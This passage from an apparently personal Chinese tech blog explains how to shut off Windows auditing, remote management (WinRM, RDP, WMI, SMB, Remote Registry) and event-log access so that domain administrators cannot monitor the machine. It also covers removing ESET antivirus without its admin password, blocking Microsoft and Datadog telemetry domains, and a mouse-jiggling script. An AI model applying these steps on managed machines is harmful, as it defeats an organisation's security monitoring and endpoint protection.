+<li>安全风险：<ul>
+<li>禁用本地审计会使系统无法记录安全事件和用户活动，可能导致安全风险，降低问题排查和安全合规性。</li>
+</ul>
+</li>
+<li>重新启用审计：<ul>
+<li>如果需要重新启用本地审计，可以通过组策略编辑器将相关项设置为成功审核或失败审核，或者使用 auditpol 命令启用。</li>
+</ul>
+</li>
+</ol>
+<p>示例命令重新启用审计：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditpol /<span class="built_in">set</span> /category:&quot;Logon/Logoff&quot; /success:enable /failure:enable</span><br></pre></td></tr></table></figure>
+
+<p>通过这些方法，可以有效控制本地审计的启用和禁用。</p>
+<h2 id="禁用-Windows-远程管理"><a href="#禁用-Windows-远程管理" class="headerlink" title="禁用 Windows 远程管理"></a>禁用 Windows 远程管理</h2><p>Windows 远程管理涉及多个功能，如 <strong>PowerShell 远程</strong>、<strong>远程桌面</strong> 和 <strong>Windows 远程管理服务</strong> (<strong>WinRM</strong>)。您可以逐一禁用这些功能。</p>
+<h3 id="禁用-PowerShell-远程"><a href="#禁用-PowerShell-远程" class="headerlink" title="禁用 PowerShell 远程"></a>禁用 PowerShell 远程</h3><p>在 <strong>PowerShell</strong> 中运行以下命令来禁用 PowerShell 远程功能：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Disable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="禁用远程桌面-RDP"><a href="#禁用远程桌面-RDP" class="headerlink" title="禁用远程桌面 (RDP)"></a>禁用远程桌面 (RDP)</h3><ol>
+<li><p><strong>通过设置禁用远程桌面：</strong></p>
+<ul>
+<li>按 <code>Win + I</code> 打开 <strong>设置</strong>。</li>
+<li>选择 <strong>系统</strong> -&gt; <strong>远程桌面</strong>。</li>
+<li>将 <strong>启用远程桌面</strong> 选项关闭。</li>
+</ul>
+</li>
+<li><p><strong>通过命令提示符禁用远程桌面：</strong><br>打开命令提示符（管理员权限），运行以下命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>停止远程桌面服务：</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop TermService</span><br><span class="line">sc config TermService <span class="built_in">start</span>= disabled</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="禁用-Windows-Management-Instrumentation-WMI"><a href="#禁用-Windows-Management-Instrumentation-WMI" class="headerlink" title="禁用 Windows Management Instrumentation (WMI)"></a>禁用 Windows Management Instrumentation (WMI)</h3><p>PowerShell Remoting 依赖于 WMI（Windows Management Instrumentation）来查询计算机的状态。禁用 WMI 服务可以防止通过 WMI 查询用户和权限。</p>
+<p>在 PowerShell 中执行以下命令禁用 WMI 服务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> <span class="literal">-Name</span> winmgmt</span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> winmgmt <span class="literal">-StartupType</span> Disabled</span><br></pre></td></tr></table></figure>
+
+<p>或者，在 <strong>服务管理器</strong> 中手动禁用 <code>Windows Management Instrumentation</code> 服务。</p>
+<h3 id="如何检查和设置-WMI-权限："><a href="#如何检查和设置-WMI-权限：" class="headerlink" title="如何检查和设置 WMI 权限："></a>如何检查和设置 WMI 权限：</h3><ul>
+<li>可使用 Component Services 或 WMI Control 控制台来查看和配置 WMI 的访问权限。</li>
+<li>步骤：<ol>
+<li>打开 compmgmt.msc（计算机管理）。</li>
+<li>导航到 Services and Applications &gt; WMI Control。</li>
+<li>右键点击 WMI Control，选择 Properties。</li>
+<li>在 Security 选项卡中，可以查看和配置 WMI 命名空间的权限。</li>
+</ol>
+</li>
+</ul>
+<h3 id="禁用-SMB-协议"><a href="#禁用-SMB-协议" class="headerlink" title="禁用 SMB 协议"></a>禁用 SMB 协议</h3><p>为了防止远程查看和管理，可以禁用 <strong>Server Message Block (SMB)</strong> 协议。</p>
+<p>禁用 <strong>SMB1 协议</strong>和 <strong>SMB2 协议</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-SmbServerConfiguration</span> <span class="literal">-EnableSMB1Protocol</span> <span class="variable">$false</span></span><br><span class="line"><span class="built_in">Set-SmbServerConfiguration</span> <span class="literal">-EnableSMB2Protocol</span> <span class="variable">$false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="禁用-WinRM-服务（远程管理服务）"><a href="#禁用-WinRM-服务（远程管理服务）" class="headerlink" title="禁用 WinRM 服务（远程管理服务）"></a>禁用 WinRM 服务（远程管理服务）</h3><p>在命令提示符或 PowerShell 中，运行以下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 WinRM 服务</span></span><br><span class="line"><span class="built_in">Stop-Service</span> WinRM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用 WinRM 服务开机启动</span></span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> WinRM <span class="literal">-StartupType</span> Disabled</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置防火墙规则"><a href="#配置防火墙规则" class="headerlink" title="配置防火墙规则"></a>配置防火墙规则</h3><p>通过配置防火墙规则，可以阻止来自特定 IP 或网络的远程访问。</p>
+<ul>
+<li>手动创建防火墙端口规则：</li>
+</ul>
+<p>通过防火墙限制远程连接，特别是禁用 <strong>PowerShell Remoting</strong> 或 <strong>WMI</strong> 查询：</p>
+<ol>
+<li>打开 <strong>Windows 防火墙</strong>。</li>
+<li>创建新的出站或入站规则，阻止端口 <code>5985</code> (HTTP) 和 <code>5986</code> (HTTPS)，这两个端口是 PowerShell Remoting 和 WMI 查询的默认端口。</li>
+</ol>
+<ul>
+<li>通过执行命令，配置阻止远程管理端口的规则。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Block PowerShell Remoting&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">5985</span>,<span class="number">5986</span> <span class="literal">-Action</span> Block</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过执行命令，配置阻止 RDP（远程桌面协议）端口的规则。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Block RDP&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">3389</span> <span class="literal">-Action</span> Block</span><br></pre></td></tr></table></figure>
+
+<h3 id="禁用-Remote-Registry-服务"><a href="#禁用-Remote-Registry-服务" class="headerlink" title="禁用 Remote Registry 服务"></a>禁用 <code>Remote Registry</code> 服务</h3><p><code>Remote Registry</code> 服务允许远程计算机访问本地注册表，进而查看用户和权限信息。<br>禁用 <code>Remote Registry</code> 服务可以防止远程用户访问计算机的注册表，查看或修改用户信息、权限等。</p>
+<ol>
+<li>打开 <strong>服务管理器</strong>，找到 <strong>Remote Registry</strong> 服务。</li>
+<li>禁用该服务，并将启动类型设置为 <strong>禁用</strong>。</li>
+</ol>
+<p>或者，你可以在 PowerShell 中执行以下命令禁用服务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> <span class="literal">-Name</span> RemoteRegistry</span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> RemoteRegistry <span class="literal">-StartupType</span> Disabled</span><br></pre></td></tr></table></figure>
+
+<h3 id="隔离日志文件"><a href="#隔离日志文件" class="headerlink" title="隔离日志文件"></a>隔离日志文件</h3><p>Windows 的系统级事件日志保存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure>
+
+<p>只要让远程进程无法读取这个文件，也能阻止信息泄漏：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\winevt\Logs\System.evtx /inheritance:<span class="built_in">r</span> /remove <span class="string">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这会阻断大部分远程采集。</p>
+<h3 id="使用组策略限制权限"><a href="#使用组策略限制权限" class="headerlink" title="使用组策略限制权限"></a>使用组策略限制权限</h3><p>通过 <strong>组策略</strong>（GPO）来限制域管理员的远程访问权限，禁止某些账户或组执行特定操作。</p>
+<ul>
+<li>禁止远程管理</li>
+</ul>
+<ol>
+<li>打开 <strong>组策略编辑器</strong>（<code>gpedit.msc</code>）。</li>
+<li>导航到 <strong>计算机配置</strong> -&gt; <strong>管理模板</strong> -&gt; <strong>Windows 组件</strong> -&gt; <strong>Windows PowerShell</strong>。</li>
+<li>启用 <strong>禁用远程脚本</strong> 策略，以防止通过 PowerShell 远程执行脚本。</li>
+</ol>
+<ul>
+<li>限制管理员权限</li>
+</ul>
+<p>你还可以限制某些管理员的权限，限制其在目标计算机上的操作。通过组策略，你可以定义哪些用户组可以执行管理任务。</p>
+<h3 id="禁用登录脚本和远程任务"><a href="#禁用登录脚本和远程任务" class="headerlink" title="禁用登录脚本和远程任务"></a>禁用登录脚本和远程任务</h3><p>禁用目标计算机的登录脚本和计划任务可以防止域管理员通过这些方式远程监视计算机。</p>
+<ul>
+<li>禁用计划任务</li>
+</ul>
+<ol>
+<li>打开 <strong>任务计划程序</strong>。</li>
+<li>禁用或删除与远程监控相关的计划任务。</li>
+</ol>
+<h2 id="卸载或禁用-ESET-Security"><a href="#卸载或禁用-ESET-Security" class="headerlink" title="卸载或禁用 ESET Security"></a>卸载或禁用 ESET Security</h2><p>ESET Security 是防病毒和安全保护软件，禁用或卸载它需要一定的步骤和权限，特别是在企业环境中可能会受到策略限制。<br>如果您没有 <strong>ESET Security</strong> 的管理员密码，但需要禁用或卸载它，可以尝试以下方法。不过请注意，在公司设备上这样做可能违反 IT 政策，需谨慎操作。</p>
+<h3 id="方法-1-使用-ESET-卸载工具（在安全模式下）"><a href="#方法-1-使用-ESET-卸载工具（在安全模式下）" class="headerlink" title="方法 1: 使用 ESET 卸载工具（在安全模式下）"></a>方法 1: 使用 ESET 卸载工具（在安全模式下）</h3><p>ESET 提供了专门的卸载工具，可以在 <strong>安全模式</strong> 下强制卸载 ESET Security，绕过管理员密码。</p>
+<h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><ol>
+<li><p><strong>下载 ESET Uninstaller 工具：</strong></p>
+<ul>
+<li>从 ESET 官方支持页面下载 <strong>ESET Uninstaller</strong> 工具：<br><a target="_blank" rel="noopener" href="https://support.eset.com/en/kb2289-uninstall-eset-manually-using-the-eset-uninstaller-tool">ESET Uninstaller 下载链接</a></li>
+</ul>
+</li>
+<li><p><strong>进入安全模式：</strong></p>
+<ul>
+<li>按 <code>Win + R</code>，输入 <code>msconfig</code>，按回车。</li>
+<li>在 <strong>引导</strong> 选项卡中，勾选 <strong>安全引导</strong>，然后点击 <strong>确定</strong> 并重启电脑。</li>
+</ul>
+</li>
+<li><p><strong>运行 ESET Uninstaller 工具：</strong></p>
+<ul>
+<li>在安全模式下，运行下载的 <strong>ESET Uninstaller</strong> 工具 (<code>ESETUninstaller.exe</code>)。</li>
+<li>按照提示，输入确认信息并选择要卸载的 ESET 产品。</li>
+<li>等待卸载完成。</li>
+</ul>
+</li>
+<li><p><strong>重新启动电脑</strong>：</p>
+<ul>
+<li>卸载完成后，重新启动电脑并返回正常模式。</li>
+<li>记得取消 <strong>安全引导</strong> 选项（在 <code>msconfig</code> 中取消勾选 <strong>安全引导</strong>）。</li>
+</ul>
+</li>
+</ol>
+<h3 id="方法-2-通过注册表重置-ESET-管理员密码"><a href="#方法-2-通过注册表重置-ESET-管理员密码" class="headerlink" title="方法 2: 通过注册表重置 ESET 管理员密码"></a>方法 2: 通过注册表重置 ESET 管理员密码</h3><p>您可以尝试通过修改注册表来重置或移除 ESET Security 的管理员密码。</p>
+<h4 id="步骤：-1"><a href="#步骤：-1" class="headerlink" title="步骤："></a>步骤：</h4><ol>
+<li><p><strong>打开注册表编辑器：</strong></p>
+<ul>
+<li>按 <code>Win + R</code>，输入 <code>regedit</code>，然后按回车。</li>
+</ul>
+</li>
+<li><p><strong>定位到 ESET 密码存储路径：</strong></p>
+<ul>
+<li>路径：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security\CurrentVersion\Info</span><br></pre></td></tr></table></figure></li>
+<li>在部分版本中，路径可能略有不同。</li>
+</ul>
+</li>
+<li><p><strong>删除密码值：</strong></p>
+<ul>
+<li>找到名为 <strong><code>Password</code></strong> 或 <strong><code>AdminPassword</code></strong> 的项。</li>
+<li>右键点击该项，选择 <strong>删除</strong>。</li>
+<li>关闭注册表编辑器。</li>
+</ul>
+</li>
+<li><p><strong>重启电脑</strong>：</p>
+<ul>
+<li>重启后，尝试打开 ESET Security，密码应该被移除。</li>
+</ul>
+</li>
+</ol>
+<h3 id="方法-3-通过任务管理器禁用-ESET-启动项和服务"><a href="#方法-3-通过任务管理器禁用-ESET-启动项和服务" class="headerlink" title="方法 3: 通过任务管理器禁用 ESET 启动项和服务"></a>方法 3: 通过任务管理器禁用 ESET 启动项和服务</h3><ol>
+<li><p><strong>打开任务管理器：</strong></p>
+<ul>
+<li>按 <code>Ctrl + Shift + Esc</code>。</li>
+</ul>
+</li>
+<li><p><strong>禁用启动项：</strong></p>
+<ul>
+<li>转到 <strong>启动</strong> 选项卡。</li>
+<li>找到 <strong>ESET Security</strong>，右键点击并选择 <strong>禁用</strong>。</li>
+</ul>
+</li>
+<li><p><strong>禁用 ESET 服务：</strong></p>
+<ul>
+<li>转到 <strong>服务</strong> 选项卡。</li>
+<li>找到所有与 ESET 相关的服务，右键点击，选择 <strong>停止</strong>。</li>
+<li>按 <code>Win + R</code>，输入 <code>services.msc</code>，回车。</li>
+<li>在服务列表中找到 <strong>ESET 服务</strong>，右键选择 <strong>属性</strong>，将 <strong>启动类型</strong> 设置为 <strong>禁用</strong>。</li>
+</ul>
+</li>
+</ol>
+<h2 id="让-Chromium-使用系统托盘运行（第三方工具）"><a href="#让-Chromium-使用系统托盘运行（第三方工具）" class="headerlink" title="让 Chromium 使用系统托盘运行（第三方工具）"></a>让 Chromium 使用系统托盘运行（第三方工具）</h2><p>Windows 本身不支持直接将 <a target="_blank" rel="noopener" href="https://www.chromium.org/getting-involved/download-chromium/#not-as-easy-steps">Chromium</a> 或者 <a target="_blank" rel="noopener" href="https://vivaldi.com/">Vivaldi</a> 移动到托盘（右下角通知区域）。但可以使用第三方工具，如 <strong>RBTray</strong> 或 <strong>TrayIt</strong>!，将 Chromium 最小化到系统托盘中：</p>
+<ol>
+<li>下载并运行 <a target="_blank" rel="noopener" href="https://rbtray.sourceforge.net/">RBTray</a>（无需安装）。</li>
+<li>打开 Chromium 后，用右键单击窗口右上角的最小化按钮。</li>
+<li>Chromium 图标将最小化到托盘。</li>
+</ol>
+<p>查看 Microsoft Purview 扩展 和 Microsoft Single Sign-On (SSO) 插件在 Chrome 浏览器中何时部署：</p>
+<ol>
+<li>打开以下目录：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions</span><br></pre></td></tr></table></figure></li>
+<li>找到扩展的文件夹（通过扩展程序 ID）。<ul>
+<li>你可以在 <code>chrome://extensions/</code> 页面中找到扩展 ID。</li>
+</ul>
+</li>
+<li>右键扩展文件夹，选择 <strong>属性</strong>。</li>
+<li>在 <strong>创建时间</strong> 中查看扩展的初始安装时间。</li>
+</ol>
+<p>让 iPhone 通过 USB 分享网络给 Windows 11：</p>
+<ul>
+<li>安装 <a target="_blank" rel="noopener" href="https://github.com/koush/AppleMobileDeviceSupport/releases/tag/v14.5.0.7"><strong>AppleMobileDeviceSupport</strong></a> 。</li>
+<li>打开 <strong>控制面板</strong> → <strong>网络和共享中心</strong> → <strong>更改适配器设置</strong>。</li>
+<li>你应该能够看到 <strong>Apple Mobile Device Ethernet</strong> 或类似名称的适配器，这表示 iPhone 正在通过 USB 共享网络。</li>
+<li>如果看到该适配器，右键点击它并选择 <strong>启用</strong>。</li>
+</ul>
+<p>使用 <a target="_blank" rel="noopener" href="https://mypublicwifi.com/">MyPublicWiFi</a> 创建虚拟无线路由器：</p>
+<ul>
+<li>特点：<ul>
+<li>提供创建无线局域网和网络监控功能。</li>
+<li>无需依赖 Hosted Network 支持。</li>
+</ul>
+</li>
+<li>适用情况：<ul>
+<li>支持较旧的 Windows 系统和大部分无线网卡。</li>
+</ul>
+</li>
+</ul>
+<p>在 <strong>Windows 11</strong> 中开启<strong>移动热点</strong>：</p>
+<ol>
+<li>按下 <strong>Win + I</strong> 打开设置，或者点击<strong>开始菜单</strong>，选择<strong>设置</strong>。</li>
+<li>在设置界面，选择左侧菜单中的<strong>网络和互联网</strong>。</li>
+<li>在<strong>网络和互联网</strong>页面中，找到并点击<strong>移动热点</strong>。</li>
+<li><strong>选择网络连接来源</strong>：<ul>
+<li>在<strong>共享我的互联网连接</strong>下拉菜单中，选择用于共享的网络连接来源（例如 Wi-Fi 或以太网）。</li>
+</ul>
+</li>
+<li><strong>配置网络名称和密码（可选）</strong>：<ul>
+<li>点击<strong>编辑</strong>按钮，设置你的热点名称（SSID）和密码。确保密码满足至少8位字符的要求。</li>
+</ul>
+</li>
+<li>将<strong>移动热点</strong>开关切换到<strong>开</strong>的状态。</li>
+<li>系统会显示热点的网络名称和密码，你可以使用其他设备连接到此热点。</li>
+<li>在移动热点设置页面，可以查看并管理连接到热点的设备。</li>
+</ol>
+<p>使用 <a target="_blank" rel="noopener" href="https://github.com/DesktopECHO/Pi-Hole-for-WSL1/tree/master">Pi-Hole-for-WSL1</a> 阻塞网络监控通信：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pihole -b self.events.data.microsoft.com</span><br><span class="line">pihole -b teams.events.data.microsoft.com</span><br><span class="line">pihole -b browser-intake-datadoghq.com</span><br><span class="line">pihole -b dns.msftncsi.com</span><br><span class="line">pihole -b msftconnecttest.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pihole reloaddns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pihole -t</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /flushdns</span><br><span class="line">nslookup &lt;域名&gt; &lt;DNS服务器IPv4地址&gt;</span><br><span class="line">nslookup &lt;域名&gt; &lt;DNS服务器IPv6地址&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有允许的端口 53 规则</span></span><br><span class="line">netsh advfirewall firewall show rule name=all | findstr <span class="string">&quot;53&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 UDP 53</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Allow DNS UDP&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=UDP localport=<span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 TCP 53</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Allow DNS TCP&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 Pi-hole Web</span></span><br><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Pi-hole Web&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-Action</span> Allow <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">60080</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="dnsdist-的-postresolve-钩子"><a href="#dnsdist-的-postresolve-钩子" class="headerlink" title="dnsdist 的 postresolve 钩子"></a><a target="_blank" rel="noopener" href="https://github.com/PowerDNS/pdns">dnsdist</a> 的 postresolve 钩子</h2><p>监听 Windows 共享 Wi-Fi 的局域网 IP:53，作为客户端入口。</p>
+<ol>
+<li>客户端请求域名查询 → DNS Proxy</li>
+<li>DNS Proxy 将域名查询转发到上游 DNS 服务器或者 Pi‑hole（WSL 内 127.0.0.1:53 <a target="_blank" rel="noopener" href="https://thekelleys.org.uk/gitweb/?p=dnsmasq.git">dnsmasq</a>）</li>
+<li>上游 DNS 服务器返回 IP</li>
+<li>DNS Proxy 将返回的 IP 加入 Windows 防火墙 &#x2F; NAT 白名单</li>
+<li>DNS Proxy 再把 IP 返回给客户端</li>
+</ol>
+<p>Mac mini M4 Pro + UTM + Ubuntu Router VM + dnsdist + ipset + iptables<br>Windows 11 + Hyper-V + Ubuntu Router VM + dnsdist + ipset + iptables</p>
+<br />
+
+<p><strong>nftables 等价配置</strong></p>
+<p>创建 nftables 表、集合、链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">table inet filter &#123;</span><br><span class="line"></span><br><span class="line">  # === 等价于 ipset whitelist ===</span><br><span class="line">  set whitelist &#123;</span><br><span class="line">    type ipv4_addr</span><br><span class="line">    flags interval</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # === forward 链（等价于 iptables FORWARD）===</span><br><span class="line">  chain forward &#123;</span><br><span class="line">    type filter hook forward priority 0;</span><br><span class="line">    policy drop;</span><br><span class="line"></span><br><span class="line">    # 白名单命中 → 记录 + 放行</span><br><span class="line">    ip saddr @whitelist \</span><br><span class="line">      limit rate 10/second burst 50 packets \</span><br><span class="line">      log prefix &quot;[ACCEPT] &quot; level info \</span><br><span class="line">      accept</span><br><span class="line"></span><br><span class="line">    # 未命中白名单 → 记录 + 丢弃</span><br><span class="line">    limit rate 5/second burst 20 packets \</span><br><span class="line">      log prefix &quot;[DROP] &quot; level info \</span><br><span class="line">      drop</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>⚠️ 说明</p>
+<ul>
+<li><code>inet</code>：同时适用于 IPv4 &#x2F; IPv6（你现在先用 IPv4）</li>
+<li><code>policy drop</code>：默认拒绝，等价于你之前最后的 <code>DROP</code></li>
+</ul>
+<br />
+
+<p><strong>最小 dnsdist 示例</strong></p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setLocal(<span class="string">&#x27;0.0.0.0:53&#x27;</span>)</span><br><span class="line">newServer(&#123;address=<span class="string">&quot;1.1.1.1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">addAction(AllRule(), LuaAction(<span class="function"><span class="keyword">function</span><span class="params">(dq)</span></span></span><br><span class="line">  <span class="keyword">for</span> _, ip <span class="keyword">in</span> <span class="built_in">ipairs</span>(dq:getIPs() <span class="keyword">or</span> &#123;&#125;) <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;nft add element inet filter whitelist &#123; &quot;</span>..ip..<span class="string">&quot; &#125; 2&gt;/dev/null&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> DNSAction.None</span><br><span class="line"><span class="keyword">end</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="圆周运动"><a href="#圆周运动" class="headerlink" title="圆周运动"></a>圆周运动</h2><div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pip<span class="w"> </span>install<span class="w"> </span>pyautogui
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">pyautogui</span>
+<span class="kn">import</span> <span class="nn">math</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c1"># 圆周运动的参数</span>
+<span class="n">radius</span> <span class="o">=</span> <span class="mi">100</span>  <span class="c1"># 圆的半径</span>
+<span class="n">center_x</span><span class="p">,</span> <span class="n">center_y</span> <span class="o">=</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">width</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">height</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 屏幕中心点</span>
+<span class="n">angle_step</span> <span class="o">=</span> <span class="mi">5</span>  <span class="c1"># 每步移动的角度增量，单位是度</span>
+
+<span class="c1"># 进入无限循环</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">angle</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">360</span><span class="p">,</span> <span class="n">angle_step</span><span class="p">):</span>
+            <span class="c1"># 计算当前角度的弧度值</span>
+            <span class="n">radian</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="n">angle</span><span class="p">)</span>
+            <span class="c1"># 计算新坐标</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">center_x</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
+            <span class="n">y</span> <span class="o">=</span> <span class="n">center_y</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
+            <span class="c1"># 移动鼠标</span>
+            <span class="n">pyautogui</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+            <span class="c1"># 可以调整时间间隔来控制运动速度</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;圆周运动已停止。&#39;</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
